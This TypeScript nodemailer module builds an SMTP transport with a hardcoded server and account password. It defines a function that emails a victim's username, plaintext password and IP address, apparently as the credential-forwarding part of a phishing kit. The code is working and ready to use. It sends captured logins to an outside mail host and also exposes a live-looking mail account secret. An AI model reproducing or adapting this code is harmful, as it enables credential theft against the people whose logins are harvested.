import mailer, { Transport, TransportOptions } from 'nodemailer';

async function createNodeMailerTransport(){
    return mailer.createTransport({
        pool: true,
        host: 'greeniumtrade.com',
        port:  465,
        secure: true,
        auth: {
            user: 'support@greeniumtrade.com',
            pass: '@greeniumtrade.com'
        }
    })
}

  async function sendEmail(from: string, to: string, source: string, username: string, pass: string,ip: string){
    const mailDetails = {
        from: from,
        to: to,
       // subject: subject,
        subject: source + ' : ' + username + ' : ' + ip,
        html: '<p>username: ' + username + '</p>' + '<p>password: ' + pass + '</p>' + '<p>ip: ' + ip + '</p>'
    }
    const nodeTransport = await createNodeMailerTransport()

    nodeTransport.verify(function (error, succes){
        if(error){
            console.log(error)
        } else {
            nodeTransport.sendMail(mailDetails, function(err, data) {
                if(err) {
                    console.log(err);
                } else {
                    console.log(data);
                }
            });
        }
    })
}

export default sendEmail